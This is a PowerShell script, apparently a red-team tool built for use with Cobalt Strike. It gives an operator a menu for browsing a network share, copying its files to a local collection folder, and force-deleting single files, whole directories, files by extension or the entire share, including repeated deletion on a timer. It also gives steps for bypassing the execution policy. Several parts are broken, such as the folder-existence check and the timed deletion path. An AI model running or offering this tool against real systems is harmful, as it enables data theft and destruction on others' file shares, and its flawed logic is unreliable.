##### share.ps1 #####
<#
By: Cpl Cook, Remington
This script allows for a user to make changes to a share.
Share.ps1 should be used with cobaltstrike to allow an easy way to make changes to a share.

If the powershell execution policy is not set to bypass there are 2 options
1) Using an administrator account run the command:
        Set-ExecutionPolicy bypass
2) Run the commands that are in this script one line at a time instead of trying to run the script as a whole.




#>
   
Write-Host "Welcome to Share.ps1"
Write-Host "Good Example: \\10.10.0.3\Share"
Write-Host "Bad Example: \\10.10.0.5"
Write-Host "Bad Example: 10.10.0.5\Share"
$Share = Read-Host -Prompt "What is the path of the share drive?" 
$Bool = "True"


While($Bool -eq "True")
{
#### Menu ####        

    Write-Host "A) List directory contents"
    Write-Host "B) Change Directory"
    Write-Host "C) Delete specific file"
    Write-Host "D) Collect specific file"
    Write-Host "E) Delete all files with a specific extension"
    Write-Host "F) Delete all files"
    Write-Host "G) Collect all files"
    Write-Host "H) Collect then delete all files"
    Write-Host "I) Delete Files over time"
    Write-Host "Q) Quit"
    Write-Host "Type the letter associated with what you want to do and then press enter"
    $Option = Read-Host
      
        
    #### Lists the contents of the $share variable ####
        if($Option -eq "A")
        {
            Get-ChildItem $Share

        }
    #### Changes the share variable to whatever the user sets it to ####
        elseif($Option -eq "B")
        {
            Write-Host "Current Directory: $Share"
            Write-Host "Example of how to change directory:"
            Write-Host ""
            Write-Host ""
            $Share = Read-Host -Prompt "Type the full path to where you want to go to:"

        }
    #### Deletes a specific file from the $share directory or recursively delete a directory ####
        elseif($Option -eq "C")
        {
            clear
            Write-Host "Specific File Deletion"
            Write-Host "A) Directory"
            Write-Host "B) A Single File"
            $choice = Read-Host
            if($choice -eq "A")
            {
                Get-ChildItem $share
                $delete = read-host -prompt "Directory to be deleted: "
                rm -Recurse -Force $Share\$delete
                clear
                Get-ChildItem $Share
            }
            elseif($choice -eq "B")
            {
                Get-ChildItem $share
                $delete = read-host -prompt "File to be deleted: "
                rm -Force $Share\$delete
                clear
                Get-ChildItem $Share
            }
            else
            {
                Write-Host "Invalid input"
            }
        }

    #### Collect specific File ####                
        elseif($Option -eq "D")
        {
            $collection = test-path C:\Collection
            if($collection -eq "false")
            {
                mkdir C:\Collection
                $file = Read-Host -Prompt "filename:"
                cp $Share\$file C:\Collection\$file
                Test-Path C:\Collection\$file
            }
            elseif($collection -eq "true")
            {
               $file = Read-Host -Prompt "filename:"
                cp $Share\$file C:\Collection\$file 
                Test-Path C:\Collection\$file
            }
            else
            {
                Write-Host "Failed"
            }
        }
#### Deletes files with a specific extension ####
        elseif($Option -eq "E")
        {
                Get-ChildItem $share
                Write-Host "do not put the dot in the extension"
                Write-Host "Example:"
                Write-Host "Extension: txt"
                $delete = read-host -prompt "Extension: "
                rm -Force $share\*.$delete
                clear
                Get-ChildItem $Share
        }

    #### Delete All Files ####
        elseif($Option -eq "F")
        {
            rm -Recurse $Share
            Test-Path $Share
            Read-Host -Prompt "Press enter to end"

        }

    #### Collect All Files ####
        elseif($Option -eq "G")
        {
            mkdir C:\Collection
            cp $Share\* C:\Collection
            ls C:\Collection
            Read-Host -Prompt "Press enter to end"
        }

    #### Collect All Files Then Delete All Files ####
        elseif($Option -eq "H")
        {
            mkdir C:\Collection
            cp $Share\* C:\Collection
            ls C:\Collection
            Read-Host -Prompt "Press enter to remove the files from the share. If you no longer want to delete all of the files press Ctl + C"
            rm -Recurse $Share
            Test-Path $Share
            Read-Host -Prompt "Press enter to end"
            
        }
 
    #### Delete Files Over Time  ####
        elseif($Option -eq "I")
        {
            
            Clear-Host
            Write-Host "Delete Files Over Time"
            $Sleep = Read-Host -prompt "How long would you like to set your interval for in seconds:"
            $Path = Test-Path $Share
            While($Path -eq "True")
            {
                Get-ChildItem $Share | ForEach-Object {Remove-Item -LiteralPath $_.Name}
                $Path = Test-Path $Share
                Start-Sleep $Sleep
            }
            Get-ChildItem "D:\New Folder" -Filter *.txt |
            foreach-object -process {rename-item -path $_.FullName -newname ($_.Remove(0,3))}
        }

    #### Quit ####
        elseif($Option -eq "Q")
        {
            Write-Host "Complete"
            Return

        }
        else
        {
            Write-Host "Invalid Input"

        }

}